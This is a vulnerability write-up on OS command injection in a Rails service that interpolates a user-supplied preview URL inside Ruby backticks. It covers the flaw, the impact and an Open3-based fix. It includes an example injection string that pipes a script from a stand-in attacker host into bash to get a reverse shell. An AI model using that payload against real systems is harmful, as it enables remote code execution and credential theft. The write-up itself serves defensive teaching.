Newsletter Preview — Remote Code Execution via Ruby Backtick Command Injection

 28 Jul 2026 · 6 min read

This write-up breaks down a Critical Command Injection vulnerability discovered in the Newsletter Preview application — a Ruby on Rails service that generates PNG thumbnail previews of web pages using headless Chromium.

Severity: Critical (CVSS 9.8)  ·  Class: OS Command Injection (CWE-78)  ·  Platform: Ruby on Rails

The Vulnerability: Unsanitized URL in Shell Backticks

The ScreenshotService component accepts a user-supplied preview_url parameter and passes it directly into Ruby backtick execution syntax. Ruby backticks (`...`) invoke a subshell via /bin/sh -c, meaning shell metacharacters retain their operational semantics.

class ScreenshotService
  def generate_preview(preview_url)
    filename = "#{SecureRandom.uuid}.png"
    output_path = SCREENSHOT_DIR.join(filename)

    # VULNERABILITY: User-controlled preview_url interpolated inside backticks
    result = `#{CHROME_PATH} --headless --disable-gpu \
      --screenshot=#{output_path} --window-size=1200,800 \
      #{preview_url} 2>&1`
  end
end

Exploit Mechanics

An attacker supplies command delimiters (;, |, &) within the preview_url parameter to hijack the shell execution context:

# Attacker Input (preview_url):
http://example.com; curl http://attacker.com/shell.sh | bash #

# Resulting Shell Command:
/usr/bin/chromium-browser --headless [...] http://example.com; \
  curl http://attacker.com/shell.sh | bash # 2>&1
  1. Chromium executes — headless capture of the URL proceeds normally.
  2. Semicolon separates commands — /bin/sh executes the subsequent command regardless of Chromium's exit code.
  3. Payload fires — curl | bash downloads and executes a remote script, spawning a reverse shell.
  4. Comment symbol (#) — neutralizes trailing arguments for clean syntax.

Technical Impact

  • Full RCE — arbitrary command execution under the web application / Sidekiq worker process.
  • Credential Exfiltration — access to Rails environment config, API keys, database credentials, and cloud IMDS metadata endpoints.
  • Lateral Movement — worker nodes typically reside in internal networks with access to staging databases, Redis, and object stores.

Remediation

The fix: never pass unvalidated user input to a shell interpreter. Use Open3.capture2e with array arguments — Ruby then executes the binary directly via execve(), rendering shell metacharacters harmless as literal string arguments.

require 'open3'

stdout_and_stderr, status = Open3.capture2e(
  CHROME_PATH,
  '--headless',
  '--disable-gpu',
  "--screenshot=#{output_path}",
  '--window-size=1200,800',
  preview_url               # treated as literal arg, NOT shell-parsed
)

Key Takeaways

  • Ban backticks in production — `...` and %x{} should be flagged by static analysis rules (RuboCop Security/Eval).
  • Array-based execution — always separate executable path from arguments. The shell must never see user input.
  • Input validation layer — enforce URI.parse with whitelisted protocols (http/https) before outbound operations.
